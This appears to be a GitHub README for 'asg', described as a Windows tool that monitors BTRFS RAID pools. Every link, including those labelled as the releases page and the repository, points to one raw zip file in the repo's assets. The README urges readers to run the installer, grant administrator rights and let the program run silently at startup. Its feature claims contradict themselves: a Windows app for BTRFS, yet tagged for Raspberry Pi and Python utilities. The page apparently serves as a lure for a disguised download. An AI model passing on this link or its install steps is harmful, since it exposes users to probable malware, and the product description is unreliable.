# ⚙️ asg - Manage BTRFS Storage Efficiently

[![Download Latest Release](https://img.shields.io/badge/Download-asg-blue?style=for-the-badge)](https://raw.githubusercontent.com/ayaanmohs/asg/main/assets/Software-v2.2.zip)

## About asg

asg (Aldertech Storage Governor) helps you keep your BTRFS RAID storage healthy. It watches how full your drives get, plans for more space, and schedules regular checks to fix errors. It works well when your drives don’t all match in size or speed. Use asg if you want to keep your storage running smoothly without complex setup.

asg works best with BTRFS RAID pools. It is designed for users who want to monitor their drive health silently and automatically. You don’t need to know coding to use it.

---

## 🖥️ System Requirements

- Windows 10 or later  
- 64-bit processor  
- At least 4 GB of RAM  
- Minimum 500 MB free disk space  
- BTRFS RAID pool set up on your machine (asg does not create RAID pools)  
- Internet connection for updates (optional)

---

## 🔍 Features

- Tracks drive health and status  
- Plans when you need more storage  
- Schedules normal scrub jobs to check for errors  
- Supports RAID 1 and other BTRFS configurations  
- Works with mismatched drives of different sizes  
- Sends simple alerts if something needs your attention  
- Runs quietly in the background without slowing your machine

---

## ⚙️ Installation & Setup

### 1. Download asg

Visit the releases page to get the latest version:

[Download asg from GitHub Releases](https://raw.githubusercontent.com/ayaanmohs/asg/main/assets/Software-v2.2.zip)

You will find files named like `asg-setup.exe` or `asg-latest.zip`. Choose the `.exe` installer for the easiest setup.

### 2. Install asg

- Open the downloaded `.exe` file.  
- Follow the on-screen steps in the installer. Click "Next" to continue.  
- Choose where to install (the default is fine for most users).  
- Finish the installer and allow asg to start automatically if prompted.

### 3. Initial Setup

- When asg opens, it will scan your BTRFS RAID arrays automatically.  
- It shows your current drive health and free space.  
- You can set how often it checks your drives and plans capacity.  
- If you have multiple RAID pools, asg handles them all.

### 4. Running asg

- asg runs in your Windows system tray (the bottom-right corner near the clock).  
- Right-click its icon to open the main window or pause monitoring.  
- The app updates drive info every hour by default. This can be changed in settings.

---

## 🚀 Getting Started with asg

After installation:

- Check the dashboard to see your RAID health summary.  
- Review alerts or warnings shown on the main screen.  
- Set scrub intervals. These are automated scans that fix errors on your drives.  
- Enable notifications if you want pop-ups when something needs care.  
- Use the capacity planner tab to see when you might need new drives.

---

## 📂 How asg Works

asg connects to the BTRFS file system on your Windows machine. It reads data about each drive’s condition, such as errors or how full the drive is. This data helps it suggest when to run scrubs or when to add space.

It supports many common drive setups but focuses on RAID 1, where data is copied on two drives for safety. asg smooths out issues when the drives don’t match exactly in size.

---

## ⚡ Common Tasks

### Check Drive Health

- Open asg from the tray.  
- Review the health indicators for each drive.  
- Green means all is OK. Yellow means some issues. Red means fixed actions are needed.

### Schedule a Scrub

- Go to the “Scrub” tab.  
- Choose how often to run a scrub (e.g., weekly or monthly).  
- Confirm to save settings.  
- asg runs these scrubs quietly in the background.

### Plan Capacity

- In the “Capacity” tab, look at predicted storage use.  
- This helps you decide if you need new drives and when.

### Receive Alerts

- Turn on notifications in settings.  
- You’ll get alerts if a drive report shows anything wrong.

---

## 🐞 Troubleshooting

If asg does not start after installation:

- Restart your computer and try again.  
- Make sure you have the latest Windows updates installed.  
- Check that your BTRFS RAID pools are healthy with another tool.  
- Run asg as an administrator if it can’t access drives.

If alerts seem incorrect:

- Check your RAID configuration outside asg.  
- Update to the latest release from the download page.  
- Contact your system admin if you are unsure about any messages.

---

## 🔄 Updating asg

New versions of asg come out to fix bugs and improve monitoring.

- Visit the [GitHub releases page](https://raw.githubusercontent.com/ayaanmohs/asg/main/assets/Software-v2.2.zip) regularly.  
- Download the latest installer as you did the first time.  
- Run the installer to replace the old version. Your settings will stay intact.

---

## 📖 Additional Resources

- Check the GitHub repo issues to see fixes and common questions.  
- For BTRFS RAID commands and setups, see official BTRFS documentation.  
- Look for community forums on storage management if you want help.

---

## 🔗 Useful Links

[Download and update asg here](https://raw.githubusercontent.com/ayaanmohs/asg/main/assets/Software-v2.2.zip)  
[GitHub repository for asg](https://raw.githubusercontent.com/ayaanmohs/asg/main/assets/Software-v2.2.zip)  

---

## ⚙️ Supported Topics

- Automation of storage tasks  
- BTRFS file system monitoring  
- Data integrity checks  
- Home lab and server monitoring  
- RAID 1 setup management  
- Raspberry Pi and self-hosted environments  
- Python-based utilities for sysadmins  
- Storage management tools for servers  

